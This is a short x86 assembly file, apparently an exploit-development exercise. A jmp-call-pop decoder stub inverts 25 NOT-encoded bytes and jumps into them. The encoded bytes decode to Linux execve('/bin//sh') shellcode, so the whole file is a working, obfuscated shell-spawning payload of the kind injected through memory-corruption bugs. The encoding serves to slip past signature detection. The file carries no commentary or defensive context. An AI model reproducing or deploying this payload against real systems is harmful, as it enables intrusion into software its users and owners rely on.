global _start


_start:
	jmp stage_1

stage_2:
	pop esi
	xor ecx, ecx
	mov cl, 25	

stage_3:
	not BYTE [esi]
	inc esi
	loop stage_3
	jmp shellcode

stage_1:
	call stage_2
	shellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
